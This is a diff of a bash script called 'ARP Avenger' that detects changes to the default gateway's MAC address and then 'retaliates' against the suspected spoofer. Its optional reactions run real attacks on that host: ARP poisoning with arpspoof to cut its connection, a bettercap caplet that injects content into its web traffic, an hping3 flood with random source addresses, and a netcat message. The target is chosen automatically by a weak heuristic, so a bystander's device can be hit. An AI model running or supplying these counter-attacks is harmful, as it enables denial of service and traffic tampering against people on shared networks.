@@ -1,13 +1,14 @@
 #!/bin/bash
-# ARP Guard Extended - First Strike Edition
-# Requires: arp-scan, arpspoof (dsniff), hping3, terminal-notifier, bettercap
+# ARP Avenger - Detect & Retaliate Against ARP Spoofers
+# Requires: arp-scan, arpspoof (dsniff), hping3, terminal-notifier, bettercap, netcat
+# Author: Fiend's Wrath Edition
 
 ### CONFIG ###
-INTERFACE="en0"  # change to your network interface
-SCAN_INTERVAL=10 # seconds between scans
-GATEWAY_IP=$(netstat -rn | awk '/default/ {print $2; exit}') # Default gateway IP
+INTERFACE="en0"  # Change to your network interface
+SCAN_INTERVAL=10 # Seconds between scans
+GATEWAY_IP=$(netstat -rn | awk '/default/ {print $2; exit}') # Auto-detect default gateway
 
-# Reaction toggles (true/false)
+# Reaction toggles
 just_alert=true
 send_message=false
 MESSAGE="Stop ARP spoofing, asshole. You've been caught."
@@ -16,21 +17,23 @@ rickroll=false
 first_strike=false
 hping_flood=false
 
-# Where to store last scan
+# Temp scan files
 SCAN_FILE=$(mktemp)
 PREVIOUS_FILE=$(mktemp)
 
 # Cleanup on Ctrl+C
 cleanup() {
-    echo -e "\n[*] Stopping all active attacks and exiting..."
-    pkill -f arpspoof
-    pkill -f hping3
-    pkill -f bettercap
+    echo -e "\n[*] Stopping all active counter-attacks..."
+    pkill -f arpspoof >/dev/null 2>&1
+    pkill -f hping3 >/dev/null 2>&1
+    pkill -f bettercap >/dev/null 2>&1
+    rm -f "$SCAN_FILE" "$PREVIOUS_FILE"
+    echo "[*] Cleanup complete. Exiting."
     exit 0
 }
 trap cleanup INT
 
-echo "[*] Starting ARP Guard Extended - First Strike on $INTERFACE"
+echo "[*] ARP Avenger starting on $INTERFACE (Gateway: $GATEWAY_IP)"
 echo "[*] Press Ctrl+C to stop."
 
 # Initial scan
@@ -39,31 +42,31 @@ sudo arp -a > "$PREVIOUS_FILE"
 while true; do
     sudo arp -a > "$SCAN_FILE"
 
-    # Extract gateway MACs from both scans
     OLD_MAC=$(grep "$GATEWAY_IP" "$PREVIOUS_FILE" | awk '{print $4}')
     NEW_MAC=$(grep "$GATEWAY_IP" "$SCAN_FILE" | awk '{print $4}')
 
     if [ "$OLD_MAC" != "$NEW_MAC" ]; then
-        echo "[!] Default Gateway MAC changed! Possible ARP spoof!"
-        echo "Old MAC: $OLD_MAC"
-        echo "New MAC: $NEW_MAC"
+        echo "[!] ALERT: Default Gateway MAC changed!"
+        echo "    Old MAC: $OLD_MAC"
+        echo "    New MAC: $NEW_MAC"
 
         ATTACKER_MAC="$NEW_MAC"
         ATTACKER_IP=$(grep "$ATTACKER_MAC" "$SCAN_FILE" | awk '{print $2}' | sed 's/[()]//g')
 
         echo "[*] Suspected Attacker: IP=$ATTACKER_IP MAC=$ATTACKER_MAC"
 
+        # --- Reaction Actions ---
         if [ "$just_alert" = true ]; then
-            terminal-notifier -title "ARP Guard Alert" -message "Gateway spoof detected from $ATTACKER_IP ($ATTACKER_MAC)"
+            terminal-notifier -title "ARP Avenger Alert" -message "Gateway spoof from $ATTACKER_IP ($ATTACKER_MAC)"
         fi
 
         if [ "$drop_network" = true ]; then
-            echo "[*] Dropping network for $ATTACKER_MAC..."
+            echo "[*] Dropping network access for $ATTACKER_IP..."
             sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
         fi
 
         if [ "$send_message" = true ]; then
-            echo "[*] Sending revenge message to $ATTACKER_IP..."
+            echo "[*] Sending message to attacker..."
             echo "$MESSAGE" | nc -w 3 "$ATTACKER_IP" 4444
         fi
 
@@ -90,16 +93,16 @@ function onRequest(req, res) {
 }
 EOF
             sudo bettercap -iface "$INTERFACE" -caplet "$RICKROLL_CAP" >/dev/null 2>&1 &
-            echo "[+] Rickroll attack launched against $ATTACKER_IP"
+            echo "[+] Rickroll launched."
         fi
 
         if [ "$first_strike" = true ]; then
-            echo "[*] FIRST STRIKE MODE: Nuking $ATTACKER_IP immediately..."
+            echo "[*] FIRST STRIKE: Nuking $ATTACKER_IP..."
             sudo arpspoof -i "$INTERFACE" -t "$ATTACKER_IP" 0.0.0.0 >/dev/null 2>&1 &
         fi
 
         if [ "$hping_flood" = true ]; then
-            echo "[*] Flooding $ATTACKER_IP with garbage packets..."
+            echo "[*] Flooding $ATTACKER_IP with packets..."
             sudo hping3 --flood --rand-source "$ATTACKER_IP" >/dev/null 2>&1 &
         fi
     fi
